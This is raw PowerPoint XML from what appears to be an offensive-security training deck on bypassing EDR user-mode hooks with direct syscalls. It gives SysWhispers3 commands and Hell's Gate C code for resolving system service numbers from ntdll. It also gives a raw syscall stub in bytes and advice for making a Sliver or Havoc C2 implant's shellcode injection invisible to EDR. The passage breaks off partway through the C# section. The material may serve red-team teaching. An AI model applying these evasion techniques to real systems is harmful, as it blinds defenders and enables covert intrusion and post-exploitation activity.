                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NtWriteVirtualMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NtQueueApcThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 directly from the ntdll.dll in memory.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Inline Assembly Execution: Write a C# or C++ payload (loaded via your C2's execute-assembly) that crafts the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 stub in memory, copies the function arguments to registers, and executes the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 instruction—completely bypassing the EDR's user-mode hook residing at the start of ntdll.dll.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Verification: Run a process injection (e.g., into notepad.exe) using the standard </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CreateRemoteThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 API (which will trigger the EDR) vs. using your Direct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 method. Capture a Process Monitor (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ProcMon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 or API Monitor trace showing that your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 executes directly without calling the hooked </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ntdll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 functions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100"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  · Integration with C2: Ensure your Sliver/Havoc implant uses this </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100"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 technique for all subsequent shellcode injections, making your EDR completely blind to your post-exploitation activities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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 Learning Goal: Understand the fundamental flaw in user-mode EDR hooking. Since EDRs cannot patch the kernel's </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 entry point (for performance reasons), executing direct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>syscalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 renders their user-mode sensors completely useless—even if they are running on the same machine.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39171679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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Task 03 Part 1: Syscall Table Extraction </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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What It Does</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Extracts System Service Numbers (SSNs) from ntdll.dll in memory to execute direct </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syscalls</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bypassing EDR user-mode hooks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Requirement (from your slide)</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"Use a tool like </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Syswhispers</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or Hell's Gate to dynamically resolve the System Service Number (SSN) for critical NTAPI functions (e.g., </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NtWriteVirtualMemory</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NtQueueApcThread</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directly from the ntdll.dll in memory."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Method 1: Syswhispers3 (Static Generation)</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Install Syswhispers3:</a:t>
            </a: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git clone https://github.com/klezVirus/SysWhispers3.git</a:t>
            </a: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cd SysWhispers3</a:t>
            </a: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Generate syscall files for specific functions:</a:t>
            </a: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python syswhispers3.py --functions </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NtWriteVirtualMemory,NtQueueApcThread</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-o </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syscalls</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python3 syswhispers3.py --functions </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NtWriteVirtualMemory,NtQueueApcThread</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-o </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syscalls</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If python3 or python are still not working use virtual env.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="836428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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>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Alternative - generate common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syscalls</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python syswhispers3.py --preset common -o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syscalls_common</a:t>
            </a:r>
            <a:endPar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Generated files:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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syscalls.h</a:t>
            </a:r>
            <a:endPar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syscalls.c</a:t>
            </a:r>
            <a:endPar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syscalls_asm.x64.asm</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Add these files to your Visual Studio project.</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Enable MASM support:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Project → Build Customizations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Check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masm</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(.targets, .props)</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Include the header and call the syscall:</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#include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syscalls.h</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NTSTATUS status =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NtWriteVirtualMemory</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processHandle</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&amp;</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baseAddress</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&amp;buffer,</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bufferSize</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&amp;</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bytesWritten</a:t>
            </a:r>
            <a:endPar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The syscall executes directly from your code, bypassing EDR hooks in ntdll.dll.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9558580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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Method 2: Hell's Gate (Dynamic Runtime Resolution)</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Hell's Gate resolves SSNs at runtime by walking the PEB and scanning ntdll.dll in memory. This is the true "dynamically resolve... directly from ntdll.dll in memory" approach.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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1: Get ntdll.dll Base Address from PEB</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PPEB </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peb</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(PPEB)__</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readgsqword</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(0x60);</a:t>
            </a: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PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)</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peb</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-&gt;</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Ldr</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-&gt;</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InMemoryOrderModuleList.Flink</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HMODULE </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ntdllBase</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(HMODULE)entry-&gt;</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DllBase</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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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2: Parse the Export Directory</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PIMAGE_DOS_HEADER </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dosHeader</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(PIMAGE_DOS_HEADER)</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ntdllBase</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PIMAGE_NT_HEADERS </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ntHeaders</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(PIMAGE_NT_HEADERS)((BYTE*)</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ntdllBase</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dosHeader</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-&gt;</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e_lfanew</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DWORD </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exportDirRVA</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ntHeaders</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-&gt;</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OptionalHeader.DataDirectory</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[IMAGE_DIRECTORY_ENTRY_EXPORT].</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VirtualAddress</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PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)</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ntdllBase</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exportDirRVA</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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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3: Locate the Function by Name</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DWORD* names = (DWORD*)((BYTE*)</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ntdllBase</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exports-&gt;</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AddressOfNames</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WORD* ordinals = (WORD*)((BYTE*)</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ntdllBase</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exports-&gt;</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AddressOfNameOrdinals</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DWORD* functions = (DWORD*)((BYTE*)</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ntdllBase</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exports-&gt;</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AddressOfFunctions</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for (DWORD </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i</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0; </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i</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&lt; exports-&gt;</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NumberOfNames</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i</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char* name = (char*)</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ntdllBase</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names[</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i</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if (</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strcmp</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(name, "</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NtWriteVirtualMemory</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0) {</a:t>
            </a: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DWORD </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functionRVA</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functions[ordinals[</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i</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BYTE* </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functionAddr</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(BYTE*)</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ntdllBase</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functionRVA</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Step 4: Extract SSN from function stub</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7712242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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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4: Extract the SSN from the Function Stub</a:t>
            </a:r>
            <a:endPar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In ntdll.dll, every syscall stub follows this pattern:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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asm</a:t>
            </a:r>
            <a:endPar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mov r10, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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rcx</a:t>
            </a:r>
            <a:endPar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mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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eax</a:t>
            </a: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SSN    ; SSN is a 4-byte value (e.g., 0x3A)</a:t>
            </a:r>
          </a:p>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syscall</a:t>
            </a:r>
          </a:p>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ret</a:t>
            </a:r>
          </a:p>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Extract the SSN:</a:t>
            </a:r>
          </a:p>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DWORD </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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ExtractSSN</a:t>
            </a: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(BYTE* </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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functionAddr</a:t>
            </a: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p>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mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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eax</a:t>
            </a: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SSN is at offset 3 (0xB8 0xXX 0x00 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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0x00</a:t>
            </a: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0x00)</a:t>
            </a:r>
          </a:p>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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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functionAddr</a:t>
            </a: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[0] == 0x4C &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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functionAddr</a:t>
            </a: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[1] == 0x8B &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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functionAddr</a:t>
            </a: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[2] == 0xD1) {</a:t>
            </a:r>
          </a:p>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mov r10, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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rcx</a:t>
            </a:r>
            <a:endPar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if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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functionAddr</a:t>
            </a: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[3] == 0xB8) {</a:t>
            </a:r>
          </a:p>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mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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eax</a:t>
            </a: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SSN</a:t>
            </a:r>
          </a:p>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DWORD </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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ssn</a:t>
            </a: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*(DWORD*)(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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functionAddr</a:t>
            </a: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+ 4);  // SSN is at offset 4</a:t>
            </a:r>
          </a:p>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return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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ssn</a:t>
            </a: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p>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p>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endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5764023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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="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return 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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5: Execute the Syscall with the Resolved SSN</a:t>
            </a:r>
            <a:endPar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Once you have the SSN, build a stub in memory and execute:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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c</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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BYTE stub[] = {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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0x4C, 0x8B, 0xD1,          // mov r10, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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rcx</a:t>
            </a:r>
            <a:endPar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0xB8, (BYTE)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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ssn</a:t>
            </a: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0x00, 0x00, 0x00, // mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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eax</a:t>
            </a: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SSN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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0x0F, 0x05,                // syscall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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0xC3                       // ret</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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p>
          <a:p>
            <a:pPr marL="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Copy this stub to executable memory and call it via a function pointer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Method 3: Halo's Gate (Enhanced Hell's Gate)</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Halo's Gate improves upon Hell's Gate by scanning for the syscall instruction rather than the mov </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eax</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SSN pattern. This makes it more</a:t>
            </a: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resilient to changes in ntdll.dll.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Verification</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To verify SSN extraction is working:</a:t>
            </a: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1. Use API Monitor on the target Windows VM.</a:t>
            </a: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2. Set a breakpoint on </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NtWriteVirtualMemory</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3. Run your syscall stub.</a:t>
            </a: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4. Verify that execution goes directly to the kernel without hitting the EDR hook.</a:t>
            </a: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Alternative verification using </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WinDbg</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endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12742525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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="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bp </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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ntdll!NtWriteVirtualMemory</a:t>
            </a:r>
            <a:endPar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Run your code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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If the breakpoint is not hit, the EDR hook is bypassed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endPar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17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Task 03 Part 2: Inline Assembly Execution (C# via execute-assembly)</a:t>
            </a:r>
            <a:endPar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17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What It Does</a:t>
            </a:r>
            <a:endPar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00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Crafts the x64 syscall stub in memory, copies function arguments to registers, and executes the syscall instruction – completely bypassing the EDR's user‑mode hook at the start of ntdll.dll.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100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Since C# does not support inline assembly, you write the stub as raw bytecode, allocate executable memory, copy the stub into it, and invoke it via a delegate.</a:t>
            </a:r>
          </a:p>
          <a:p>
